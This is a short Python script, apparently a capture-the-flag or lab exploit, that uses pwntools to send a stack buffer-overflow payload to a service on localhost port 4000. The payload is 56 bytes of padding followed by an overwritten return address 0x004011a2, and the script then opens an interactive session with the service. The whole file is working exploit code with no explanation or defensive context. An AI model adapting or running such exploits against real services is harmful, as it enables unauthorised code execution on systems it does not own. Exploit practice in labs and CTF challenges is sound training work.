import pwn

EXPLOIT = b'A'*56 + pwn.p64(0x004011a2) + b'\b'

conn = pwn.remote('localhost', 4000)
print(conn.recvuntil(b'>>> '))

conn.sendline(EXPLOIT)
conn.interactive()